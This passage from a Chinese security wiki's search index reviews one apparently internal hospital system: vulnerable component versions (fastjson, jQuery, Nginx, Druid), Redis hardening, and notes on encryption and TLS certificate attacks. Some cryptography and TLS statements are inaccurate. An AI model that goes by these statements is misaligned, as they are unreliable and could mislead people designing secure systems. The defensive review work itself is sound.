\u63d0\u6743\u6f0f\u6d1e\uff0c\u501f\u52a9nginx\u65e5\u5fd7\uff0c\u63d0\u53d6\u5230root\u3002\uff082016-10\uff09","title":"5.2.17.1. *Nginx*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52172-jquery","text":"http://192.168.1.120:8080/amol-hospital/js/jquery-1.9.1.min.js http://192.168.1.120:8080/amol-hospital/js/ueditor/third-party/jquery-1.10.2.min.js \u5728\u5b98\u7f51\u4e0a\u6ca1\u6709\u627e\u5230\u76f8\u5e94\u7684\u5b89\u5168\u6f0f\u6d1e\u5217\u8868 https://blog.jquery.com/2013/02/04/jquery-1-9-1-released/ Jquery\u4e24\u4e2a\u7248\u672c\u95f4\u66f4\u65b0\u65e5\u5fd7\uff0c\u5176\u4e2d\u6709\u4e24\u5904vulnerable\u5b57\u6837 https://github.com/jquery/jquery/compare/1.9.1...1.12.3","title":"5.2.17.2. *Jquery*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52173-java","text":"\uff08\u653e\u5230\u64cd\u4f5c\u7cfb\u7edf\u90e8\u5206\uff0cnessus\u53ef\u4ee5\u5f88\u597d\u7684\u68c0\u67e5\u8fd9\u4e2a\uff09","title":"5.2.17.3. *Java\u6f0f\u6d1e*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52174-ueditor143","text":"","title":"5.2.17.4. *\u767e\u5ea6Ueditor\uff081.4.3\uff09*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52175-nodejs","text":"node -v v0.10.42","title":"5.2.17.5. *Node.js(\u8d85\u58f0\u89c6\u9891\u4f7f\u7528)*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52176-spring","text":"","title":"5.2.17.6. *Spring*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52177-mybitas","text":"","title":"5.2.17.7. *Mybitas*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52178-druid","text":"\u6570\u636e\u5e93\u8fde\u63a5\u6c60\u7ec4\u4ef6\uff0c\u5305\u62ec\u56db\u90e8\u5206\uff1aDruidDriver\u3001DruidDataSource\u3001SQLParsr\u3001\u6269\u5c55\u7ec4\u4ef6\u3002 \u53ef\u4ee5\u76d1\u63a7\u6570\u636e\u5e93\u8bbf\u95ee\u6027\u80fd\uff0cDruid\u5185\u7f6e\u63d0\u4f9b\u4e86\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684 StatFilter \u63d2\u4ef6\uff0c\u80fd\u591f\u8be6\u7ec6\u7edf\u8ba1SQL\u7684\u6267\u884c\u6027\u80fd\uff0c\u8fd9\u5bf9\u4e8e\u7ebf\u4e0a\u5206\u6790\u6570\u636e\u5e93\u8bbf\u95ee\u6027\u80fd\u6709\u5e2e\u52a9\u3002\u66ff\u6362DBCP\u548cC3P0\u3002Druid\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ad8\u6548\u3001\u529f\u80fd\u5f3a\u5927\u3001\u53ef\u6269\u5c55\u6027\u597d\u7684\u6570\u636e\u5e93\u8fde\u63a5\u6c60\u3002SQL\u6267\u884c\u65e5\u5fd7\uff0cDruid\u63d0\u4f9b\u4e86\u4e0d\u540c\u7684LogFilter\uff0c\u80fd\u591f\u652f\u6301Common-Logging\u3001Log4j\u548cJdkLog\uff0c\u4f60\u53ef\u4ee5\u6309\u9700\u8981\u9009\u62e9\u76f8\u5e94\u7684LogFilter\uff0c\u76d1\u63a7\u4f60\u5e94\u7528\u7684\u6570\u636e\u5e93\u8bbf\u95ee\u60c5\u51b5\u3002\u6269\u5c55JDBC\uff0c\u5982\u679c\u4f60\u8981\u5bf9JDBC\u5c42\u6709\u7f16\u7a0b\u7684\u9700\u6c42\uff0c\u53ef\u4ee5\u901a\u8fc7Druid\u63d0\u4f9b\u7684Filter\u673a\u5236\uff0c\u5f88\u65b9\u4fbf\u7f16\u5199JDBC\u5c42\u7684\u6269\u5c55\u63d2\u4ef6\u3002 1\u3001\u8bbf\u95ee\u6ca1\u6709\u6743\u9650\u63a7\u5236","title":"5.2.17.8. *Druid*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52179-turnserver","text":"TurnServer \u662f\u4e00\u4e2aTURN\u534f\u8bae\u7684\u5f00\u6e90\u5b9e\u73b0\u3002 \u8be5\u534f\u8bae\u5141\u8bb8\u4e00\u4e2a\u5ba2\u6237\u7aef\u4ee5relay\u65b9\u5f0f\u83b7\u5f97IP\u5730\u5740\u548c\u7aef\u53e3\u3002\u8fd9\u5bf9\u4e8esymmetric \u7c7b\u578b\u7684NAT\u6216\u8005\u9632\u706b\u5899\u4e24\u8fb9\u8bbe\u5907\u7684\u901a\u4fe1\u975e\u5e38\u6709\u7528\u3002 TurnServer\u9879\u76ee\u65e8\u5728\u517c\u5bb9\u5730\u5904\u7406 TURN \u548c STUN\u8bf7\u6c42 (RFC 5766 , RFC 5389)\uff0c\u540c\u65f6\u4e5f\u652f\u6301 RFC6156 \u5373 TURN-IPV6 (relay between IPv4-IPv6, IPv6-IPv4 and IPv6-IPv6 addresses) \u548c RFC6062 \u5373TURN-TCP (relay data with TCP)","title":"5.2.17.9. *Turnserver*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#521710-terracottasession","text":"","title":"5.2.17.10. *Terracotta(session\u5171\u4eab)*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#521711-phpmyadmin","text":"http://www.phpmyadmin.net/security/","title":"5.2.17.11. *phpMyAdmin*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#521712-redis","text":"1\u3001\u6307\u5b9aredis\u670d\u52a1\u4f7f\u7528\u7684\u7f51\u5361 \uff08\u9700\u8981\u91cd\u542fredis\u624d\u80fd\u751f\u6548\uff09 \u5728 redis.conf \u6587\u4ef6\u4e2d\u627e\u5230 \u201c# bind 127.0.0.1\u201d \uff0c\u628a\u524d\u9762\u7684#\u53f7\u53bb\u6389\uff0c\u7136\u540e\u4fdd\u5b58\u3002\u6ce8\uff1a\u4fee\u6539\u540e\u53ea\u6709\u672c\u673a\u624d\u80fd\u8bbf\u95eeRedis\u3002 2\u3001\u8bbe\u7f6e\u8bbf\u95ee\u5bc6\u7801 \uff08\u9700\u8981\u91cd\u542fredis\u624d\u80fd\u751f\u6548\uff09 \u5728 redis.conf \u4e2d\u627e\u5230\u201crequirepass\u201d\u5b57\u6bb5\uff0c\u5728\u540e\u9762\u586b\u4e0a\u4f60\u9700\u8981\u7684\u5bc6\u7801\uff0cRedis\u5ba2\u6237\u7aef\u4e5f\u9700\u8981\u4f7f\u7528\u6b64\u5bc6\u7801\u6765\u8bbf\u95eeRedis\u670d\u52a1\u3002 3\u3001\u4fee\u6539Redis\u670d\u52a1\u8fd0\u884c\u8d26\u53f7 \uff08\u9700\u8981\u91cd\u542fredis\u624d\u80fd\u751f\u6548\uff09 \u8bf7\u4ee5\u8f83\u4f4e\u6743\u9650\u8d26\u53f7\u8fd0\u884cRedis\u670d\u52a1\uff0c\u4e14\u7981\u7528\u8be5\u8d26\u53f7\u7684\u767b\u5f55\u6743\u9650\u3002\u53e6\u5916\u53ef\u4ee5\u9650\u5236\u653b\u51fb\u8005\u5f80\u654f\u611f\u5199\u5165\u6587\u4ef6\uff0c\u4f46\u662fRedis\u6570\u636e\u8fd8\u662f\u80fd\u88ab\u9ed1\u5ba2\u8bbf\u95ee\u5230\uff0c\u6216\u8005\u88ab\u9ed1\u5ba2\u6076\u610f\u5220\u9664\u3002 4\u3001\u8bbe\u7f6e\u9632\u706b\u5899\u7b56\u7565 \u5982\u679c\u6b63\u5e38\u4e1a\u52a1\u4e2dRedis\u670d\u52a1\u9700\u8981\u88ab\u5176\u4ed6\u670d\u52a1\u5668\u6765\u8bbf\u95ee\uff0c\u53ef\u4ee5\u8bbe\u7f6eiptables\u7b56\u7565\u4ec5\u5141\u8bb8\u6307\u5b9a\u7684IP\u6765\u8bbf\u95eeRedis\u670d\u52a1\u3002 \u53c2\u8003\uff1a https://help.aliyun.com/knowledge_detail/37447.html?spm=5176.7837442.2.10.nCzE5s","title":"5.2.17.12. *Redis*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#521713-fastjsonjar","text":"https://github.com/alibaba/fastjson/wiki/security_update_20170315 fastjson\u6700\u65b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u9ad8\u5371\u5b89\u5168\u6f0f\u6d1e\uff0c\u5f53\u524d\u6d89\u53ca1.2.24\u4e4b\u524d\u7248\u672c \u6211\u4eec\u7528\u76841.1.41","title":"5.2.17.13. *Fastjson\u5f00\u6e90jar*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5218-web","text":"\u5e38\u89c1\u7684\u7b80\u5355\u5f62\u5f0f--\u8bf1\u5bfc\u4f18\u5316\u6253\u5f00\u5177\u6709\u7f51\u9875\u6728\u9a6c\u7684\u9875\u9762\uff0c\u4e00\u822c\u662f\u5199\u5165js\u5f15\u7528\u5927\u9a6c\u7684\u4ee3\u7801\u7f51\u9875\uff0c\u7528\u6237\u6253\u5f00\u8bf1\u5bfc\u7f51\u9875\u540e\u5728\u7535\u8111\u4e0a\u5b9e\u9645\u4e0a\u5df2\u7ecf\u9ed8\u8ba4\u8fd0\u884c\u4e86\u4e0b\u8f7d\u5927\u9a6c\u548c\u6267\u884c\u5927\u9a6c\u7684\u64cd\u4f5c","title":"5.2.18. *Web\u6728\u9a6c*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#53","text":"","title":"5.3. *\u654f\u611f\u6570\u636e\u4fdd\u62a4*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#531","text":"\u7b97\u6cd5\u5217\u8868\u80fd\u7528\uff0c\u4e0d\u80fd\u7528 \u5f31\u7b97\u6cd5\uff1amd2\uff0cmd4\uff0cmd5\uff082004\u5e74\u7684\u56fd\u9645\u5bc6\u7801\u5b66\u4f1a\u8bae\uff08Crypto\u20192004\uff09\u738b\u5c0f\u4e91\u8bc1\u660e\u4e86MD5\u53ef\u4ee5\u88ab\u78b0\u649e\uff0c\u81f3\u6b64\uff0cMD5\u4e0d\u518d\u5b89\u5168\uff09 \uff0csha1\uff0cblowfish \u63a8\u8350\u7b97\u6cd5\uff1asha256\uff0caes128 \u53ef\u9006\u7684\u52a0\u5bc6\u7b97\u6cd5\uff1ades 3des aes128 \u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5\u53c8\u5206\u4e3a\u4e24\u5927\u7c7b\uff1a\u201c\u5bf9\u79f0\u5f0f\u201d\u548c\u201c\u975e\u5bf9\u79f0\u5f0f\u201d\u3002 \u5bf9\u79f0\u5f0f\u52a0\u5bc6\u7279\u70b9\uff1a\u52a0\u5bc6\u548c\u89e3\u5bc6\u4f7f\u7528\u540c\u4e00\u4e2a\u5bc6\u94a5\uff0c\u901a\u5e38\u79f0\u4e4b\u4e3a\u201cSession Key \u201d\u3002 DES\u30013DES\u3001DESX\u3001Blowfish\u3001IDEA\u3001RC4\u3001RC5\u3001RC6\u548cAES \u975e\u5bf9\u79f0\u5f0f\u52a0\u5bc6\u7279\u70b9\uff1a\u52a0\u5bc6\u548c\u89e3\u5bc6\u6240\u4f7f\u7528\u7684\u4e0d\u662f\u540c\u4e00\u4e2a\u5bc6\u94a5\uff0c\u800c\u662f\u4e24\u4e2a\u5bc6\u94a5\uff1a\u4e00\u4e2a\u79f0\u4e3a\u201c\u516c\u94a5\u201d\uff0c\u53e6\u4e00\u4e2a\u79f0\u4e3a\u201c\u79c1\u94a5\u201d\uff1b\u5b83\u4eec\u4e24\u4e2a\u5fc5\u987b\u914d\u5bf9\u4f7f\u7528\uff0c\u5426\u5219\u4e0d\u80fd\u6253\u5f00\u52a0\u5bc6\u6587\u4ef6\u3002\u8fd9\u91cc\u7684\u201c\u516c\u94a5\u201d\u662f\u6307\u53ef\u4ee5\u5bf9\u5916\u516c\u5e03\u7684\uff0c\u201c\u79c1\u94a5\u201d\u5219\u53ea\u80fd\u7531\u6301\u6709\u4eba\u672c\u4eba\u77e5\u9053\u3002 \u5e38\u89c1\u7684\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\uff1aRSA\u3001ECC\uff08\u79fb\u52a8\u8bbe\u5907\u7528\uff09\u3001Diffie-Hellman\u3001El Gamal\u3001DSA\uff08\u6570\u5b57\u7b7e\u540d\u7528\uff09 \u4e0d\u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5\uff1asha256 sha512 md5 \u4e0d\u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5\u7684\u7279\u5f81\u662f\uff0c\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u4e0d\u9700\u8981\u4f7f\u7528\u5bc6\u94a5\uff0c\u8f93\u5165\u660e\u6587\u540e\u7531\u7cfb\u7edf\u76f4\u63a5\u7ecf\u8fc7\u52a0\u5bc6\u7b97\u6cd5\u5904\u7406\u6210\u5bc6\u6587\u3002\u8fd9\u79cd\u52a0\u5bc6\u540e\u7684\u6570\u636e\u662f\u65e0\u6cd5\u88ab\u89e3\u5bc6\u7684\uff0c\u53ea\u6709\u91cd\u65b0\u8f93\u5165\u660e\u6587\u3002 \u5e38\u89c1\u7684Hash\u7b97\u6cd5\uff1aMD2\u3001MD4\u3001MD5\u3001HAVAL\u3001SHA\u3001SHA-1\u3001HMAC\u3001HMAC-MD5\u3001HMAC-SHA1 \u53c2\u8003\uff1a http://www.360doc.com/content/13/0402/15/3862791_275529254.shtml http://book.51cto.com/art/201109/294599.htm MD5\u8f93\u51fa128bit SHA1\u8f93\u51fa160bit SHA256\u8f93\u51fa256bit \u53e6\u5916\u8fd8\u6709SHA244,SHA512 \u5206\u522b\u8f93\u51fa244bit\uff0c512bit \u95ee\u9898\u5206\u6790 \u6570\u636e\u5e93\u4e2d\u7684\u5bc6\u7801\u7684\u673a\u5bc6\u7b97\u6cd5\u63a8\u8350\uff1a 1\u3001\u4f7f\u7528\u4e0d\u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5 2\u3001\u4f7f\u7528\u52a0\u76d0\uff08\u907f\u514d\u9884\u5148\u8ba1\u7b97\u5f69\u8679\u8868\uff09 \u5efa\u8bae\u7684\u7528\u6237\u5bc6\u7801\u52a0\u5bc6\u5f62\u5f0f\uff1a http\uff1a\u82e5\u901a\u9053\u672a\u52a0\u5bc6\uff0c\u5bc6\u7801\u5728\u5ba2\u6237\u7aef\u4f7f\u7528\u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5AES-256\u5e76\u52a0\u76d0\uff08\u4ece\u670d\u52a1\u7aef\u83b7\u53d6\u6311\u6218\u7801\u5373\u76d0\u503c\uff09\uff0c\u4f20\u8f93\u5230\u670d\u52a1\u7aef\u518d\u89e3\u5bc6\u3002 https\uff1a\u670d\u52a1\u7aef\u63a5\u53d7\u5230\u660e\u6587\u5bc6\u7801\u540e\u4f7f\u7528\u4e0d\u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5\u5bf9\u5bc6\u7801\u8fdb\u884c\u54c8\u5e0c\u52a0\u5bc6SHA256\u5e76\u52a0\u76d0\uff08\u4f7f\u7528\u5b89\u5168\u968f\u673a\u76d0\u503c\uff0c\u957f\u5ea6\u5efa\u8bae\u8ddf\u5bc6\u7801\u6700\u957f\u4e00\u81f4\uff09\uff0c\u518d\u5b58\u5165\u5bc6\u7801\u5bc6\u6587\u548c\u76d0\u503c\u5230\u6570\u636e\u5e93\u3002","title":"5.3.1. *\u52a0\u5bc6\u7b97\u6cd5*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#532","text":"\u6211\u4eec\u4e00\u822c\u8bf4\u7684\u8bc1\u4e66\u90fd\u662f\u670d\u52a1\u7aef\u8bc1\u4e66\uff0c\u5373\u6d4f\u89c8\u5668\u4f7f\u7528\u7684\u9a8c\u8bc1\u670d\u52a1\u5668\u8eab\u4efd\u7684\u8bc1\u4e66\u3002 \u6211\u4eec\u7684\u8bc1\u4e66\u662f\u81ea\u751f\u6210\u7684\u8bc1\u4e66\u3002 \u8bc1\u4e66\uff1a\u8bc1\u660e\u8eab\u4efd\u7684\u51ed\u636e\uff0c\u8bc1\u4e66\u4e2d\u5fc3\u7528\u81ea\u5df1\u7684\u79c1\u94a5\u5bf9\u4fe1\u606f\u53d1\u9001\u8005\u7684\u516c\u94a5\u548c\u4e00\u4e9b\u4fe1\u606f\u4e00\u8d77\u7684\u52a0\u5bc6\uff0c\u8bc1\u4e66\u53ef\u4ee5\u4fdd\u8bc1\u516c\u94a5\u7684\u5b89\u5168\u6027\u548c\u6709\u6548\u65b0\uff0c\u516c\u94a5\u53ef\u4ee5\u9a8c\u8bc1\u79c1\u94a5\u6301\u6709\u65b9\u7684\u8eab\u4efd\u3002\u5e38\u89c4\u4fe1\u606f\u6709\uff1a\u9881\u53d1\u7ed9\u7684\u901a\u7528\u540d\u3001\u7ec4\u7ec7\u3001\u7ec4\u7ec7\u5355\u5143\u3001\u5e8f\u5217\u53f7\u548c\u9881\u53d1\u8005\u7684\u901a\u7528\u540d\u3001\u7ec4\u7ec7\u3001\u7ec4\u7ec7\u5355\u5143\uff0c\u6709\u6548\u65f6\u95f4\u5f00\u59cb\u4e8e\u3001\u8fc7\u671f\u65f6\u95f4\uff0c\u6307\u7eb9SHA-256\u6307\u7eb9\u548cSHA1\u6307\u7eb9\u3002\u8be6\u7ec6\u4fe1\u606f\u8fd8\u6709\u8bc1\u4e66\u7684\u7b7e\u540d\u7b97\u6cd5\u3001\u516c\u94a5\u7b97\u6cd5\u3001\u516c\u94a5\u7b49\u3002 \u7b7e\u540d\u54c8\u5e0c\u7b97\u6cd5\uff1a\u8bc1\u4e66\u7f16\u7801\u5b8c\u6574\u6027\u4fdd\u8bc1\u7684\u54c8\u5e0c\u7b97\u6cd5 \u7b7e\u540d\u7b97\u6cd5\uff1a\u79c1\u94a5\u5bf9\u8bc1\u4e66\u7f16\u7801\u7684\u54c8\u5e0c\u52a0\u5bc6\u7684\u7b97\u6cd5\uff1b\u8bc1\u4e66\u7b7e\u540d\u4f7f\u7528\u7684\u7b97\u6cd5\u662f\u53d1\u5e03\u8005\u81ea\u5df1\u89c4\u5b9a\u7684 \u4e0a\u9762\u4e24\u4e2a\u662f\u53d1\u5e03\u673a\u6784\u641e\u5f97\uff0c\u7528\u6765CA\u9a8c\u8bc1\u7684 \u6307\u7eb9\u7b97\u6cd5\uff1a\u8ba1\u7b97\u51fa\u6307\u7eb9\u7684\u54c8\u5e0c\u7684\u7b97\u6cd5\uff0c\u5c31\u662f\u54c8\u5e0c\u7b97\u6cd5\uff0c\u4e00\u822c\u5c31\u662fsha1 \u6307\u7eb9\uff1a\u8bc1\u4e66\u7684\u54c8\u5e0c\u503c\u5e76\u7528\u79c1\u94a5\u52a0\u5bc6\u3002 \u9274\u522b\u7528\u6237\u7684\u771f\u4f2a\u53ef\u4ee5\u901a\u8fc7\u9274\u522b\u7528\u6237\u7684\u79c1\u94a5\u7684\u771f\u4f2a\u6765\u786e\u8ba4\uff0c\u5c31\u662f\u770b\u52a0\u5bc6\u7684\u4fe1\u606f\u670d\u52a1\u7aef\u662f\u5426\u53ef\u4ee5\u89e3\u5bc6\u3002 \u516c\u94a5\uff1a\u8fde\u63a5\u5efa\u7acb\u65f6\u6d4f\u89c8\u5668\u7aef\u52a0\u5bc6\u65f6\u4f7f\u7528\u7684\u79d8\u94a5\u3002 \u79c1\u94a5\uff1a\u8fde\u63a5\u5efa\u7acb\u65f6\u670d\u52a1\u5668\u7aef\u52a0\u5bc6\u65f6\u4f7f\u7528\u7684\u79d8\u94a5\u3002 \u4f7f\u7528\u65f6\uff1a \u6b65\u9aa4\u4e00\uff1a 1\u3001\u6d4f\u89c8\u5668\u8f93\u5165\u7f51\u5740\u8bbf\u95eeyizhen.cn\uff08\u5e94\u7528\u5c42\u7684\uff09 2\u3001\u6d4f\u89c8\u5668\u5e95\u5c42\u7684TSL\u534f\u8bae\u53d1\u9001\u660e\u6587\u7684Hello\u4fe1\u606f\u7ed9\u670d\u52a1\u5668\uff08\u7f51\u7edc\u5c42\uff09 3\u3001\u670d\u52a1\u5668\u54cd\u5e94\u4e00\u4e2aHello\u4fe1\u606f\u7ed9\u6d4f\u89c8\u5668 \u6b65\u9aa4\u4e8c\uff1a \u670d\u52a1\u5668\u7aef\u53d1\u9001\u5b83\u7684\u8bc1\u4e66\u7ed9\u6d4f\u89c8\u5668\uff08\u56fe\u4e2d\u7684\u4e09\uff0c\u56fe\u4e2d\u7684\u4e8c\u662f\u4e4b\u524d\u5c31\u751f\u6210\u597d\u7684\uff0c\u5b58\u50a8\u5728\u670d\u52a1\u7aef\u7684\u516c\u94a5\u3001\u79c1\u94a5\u3001\u8bc1\u4e66\uff09 \u6b65\u9aa4\u4e09\uff1a 1\u3001\u5ba2\u6237\u7aef\u9a8c\u8bc1\u670d\u52a1\u7aef\u53d1\u6765\u7684\u8bc1\u4e66 2\u3001\u9a8c\u8bc1\u8bc1\u4e66\u7684\u7b7e\u540d\u3001\u5b8c\u6574\u6027\u7b49\u4fe1\u606f 3\u3001\u53bb\u6d4f\u89c8\u5668\u8bc1\u4e66\u7ba1\u7406\u4e2d\u5fc3\u9a8c\u8bc1\u8bc1\u4e66\u662f\u5426\u53ef\u4fe1\uff0c\u662f\u5426\u4e3a\u53ef\u4fe1\u673a\u6784\u7684\u8bc1\u4e66\u6216\u8005\u5b50\u8bc1\u4e66 4\u3001\u5982\u679c\u4e0d\u53ef\u4fe1\uff0c\u6d4f\u89c8\u5668\u629b\u51fa\u8b66\u544a\uff0c\u63d0\u793a\u7528\u6237\uff0c\u9700\u8981\u7528\u6237\u786e\u8ba4\u9009\u62e9\u662f\u5426\u7ee7\u7eed \u6b65\u9aa4\u56db\uff1a 1\u3001\u6d4f\u89c8\u5668\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u7684\u503c\uff0c\u4f5c\u4e3a\u79d8\u94a5\uff0c\u5bf9\u79f0\u52a0\u5bc6\u7684\u79d8\u94a5\uff0c\u6b64\u5904\u5c31\u79f0\u4e3a\u79d8\u94a5\u3002 2\u3001\u4f7f\u7528\u8bc1\u4e66\u4e2d\u7684\u516c\u94a5\u5bf9\u4ea7\u751f\u7684\u79d8\u94a5\u8fdb\u884c\u52a0\u5bc6\u751f\u6210\u5bc6\u6587\u4e32 \u6b65\u9aa4\u4e94\uff1a 1\u3001\u53d1\u9001\u5bc6\u6587\u4e32\u7ed9\u670d\u52a1\u5668 2\u3001\u670d\u52a1\u5668\u63a5\u53d7\u5230\u5bc6\u6587\u4e32\uff0c\u4f7f\u7528\u8bc1\u4e66\u7684\u79c1\u94a5\u8fdb\u884c\u89e3\u5bc6\uff0c\u83b7\u5f97\u5bf9\u79f0\u52a0\u5bc6\u7684\u79d8\u94a5\u3002 3\u3001\u670d\u52a1\u5668\u4f7f\u7528\u5bf9\u79f0\u79d8\u94a5\u52a0\u5bc6\u54cd\u5e94\u62a5\u6587\u5185\u5bb9\u53d1\u9001\u7ed9\u6d4f\u89c8\u5668\u3002 \u6b65\u9aa4\u516d\uff1a \u670d\u52a1\u5668\u548c\u6d4f\u89c8\u5668\u53ef\u4ee5\u901a\u8baf\u4e86\u3002 \u6d4f\u89c8\u5668\u53d1\u9001\u7684\u6570\u636e\u90fd\u662f\u516c\u94a5\u52a0\u5bc6\uff0c\u4f7f\u7528\u5bf9\u79f0\u79d8\u94a5\u89e3\u5bc6\u6536\u5230\u7684\u6570\u636e\u3002 \u670d\u52a1\u5668\u53d1\u9001\u7684\u6570\u636e\u90fd\u662f\u5bf9\u79f0\u79d8\u94a5\u52a0\u5bc6\u7684\uff0c\u6536\u5230\u7684\u6570\u636e\u4f7f\u7528\u79c1\u94a5\u89e3\u5bc6\u3002 \u7b80\u5355\u793a\u610f\u56fe\u5982\u4e0b\uff1a *\u8bc1\u4e66\u4ecb\u7ecd\u548c\u653b\u51fb* Pem\u683c\u5f0f\u7684\u8bc1\u4e66\u8be6\u7ec6\u4fe1\u606f\u67e5\u770b\uff1a https://www.trustasia.com/tools/cert-decoder.htm SSL\u8bc1\u4e66\u88ab\u653b\u51fb\u3001\u5047\u5192\u7684\u98ce\u9669\u5206\u6790 http://wenku.baidu.com/link?url=LkghTfA11JWJBLFJrgBZfCrIBFJoqfcH1q4xBEbzt3xmGtkR7mdkV91mUnRobYQKYz2ekVTo7XNQdOMHIuOpWZv4TBDBVsBo52dYNeX1zRi \u4e00\u4e2a\u5408\u6cd5\u6709\u6548\u7684SSL\u8bc1\u4e66\u8bef\u7b7e\u53d1\u7ed9\u4e86\u5047\u5192\u8005\uff08--\uff09 \u7834\u89e3SSL\u8bc1\u4e66\u7b7e\u53d1CA\u7684\u79c1\u94a5\uff08\u5173\u6ce8\u7b7e\u540d\u7b97\u6cd5\uff09 SSL\u8bc1\u4e66\u7b7e\u53d1CA\u7684\u79c1\u94a5\u6cc4\u9732\uff08\u5982\u679c\u662f\u81ea\u7b7e\u540d\u8bc1\u4e66\u9700\u8981\u5173\u6ce8\uff09 \u7834\u89e3SSL\u8bc1\u4e66\u7684\u79c1\u94a5\uff08\u5173\u6ce8\u6307\u7eb9\u7b97\u6cd5\uff09 SSL\u8bc1\u4e66\u7684\u79c1\u94a5\u6cc4\u9732\uff08\u670d\u52a1\u5668\u7aef\u79c1\u94a5\u7684\u5b58\u8d2e\uff09 \u8ba4\u8bc1\u673a\u6784\u4e3b\u52a8\u4e3a\u5047\u5192\u7f51\u7ad9\u7b7e\u53d1\u5408\u6cd5\u6709\u6548\u7684\u8bc1\u4e66\uff08--\uff09 \u5229\u7528\u53ef\u4fe1\u7684SSL\u670d\u52a1\u5668\u8bc1\u4e66\u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff08--\uff09 \u5728\u7528\u6237\u4e3b\u673a\u4e2d\u690d\u5165\u4f2a\u9020\u7684\u6839CA\u8bc1\u4e66\uff08\u6216\u4e00\u4e2a\u5b8c\u6574\u7684CA\u8bc1\u4e66\u94fe\uff09\uff08--\uff09 \u65c1\u8def\u8bc1\u4e66\u7684\u53ef\u4fe1\u6027\u7684\u9a8c\u8bc1\uff08--\u6d4f\u89c8\u5668\u64cd\u4f5c\u7cfb\u7edf\u6f0f\u6d1e\uff09 ---\u5982\u679c\u8bc1\u4e66\u7684\u8ddf\u8bc1\u4e66\u6ca1\u6709\uff0c\u7b2c\u4e00\u6b21\u8bbf\u95ee\u4f1a\u53bb\u8bc1\u4e66\u7f51\u7ad9\u83b7\u53d6\u6839\u8bc1\u4e66\u6216\u8005\u4e2d\u95f4\u8bc1\u4e66","title":"5.3.2. *\u8bc1\u4e66*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5321","text":"1\u3001\u8bc1\u4e66\u7684\u6307\u7eb9\u7b97\u6cd5\u662f\u5426\u5b89\u5168\uff0c\u4e0d\u5b89\u5168\u7684\u7b97\u6cd5\u9020\u6210\u8bc1\u4e66\u52a0\u5bc6\u4f20\u8f93\u7684\u4fe1\u606f\u53ef\u4ee5\u88ab\u89e3\u5bc6 2\u3001\u8bc1\u4e66\u7684\u7b7e\u540d\u7b97\u6cd5\u662f\u5426\u5b89\u5168\uff0c\u4e0d\u5b89\u5168\u7684\u7b7e\u540d\u7b97\u6cd5\u53ef\u80fd\u9020\u6210\u8bc1\u4e66\u88ab\u4f2a\u9020","title":"5.3.2.1. 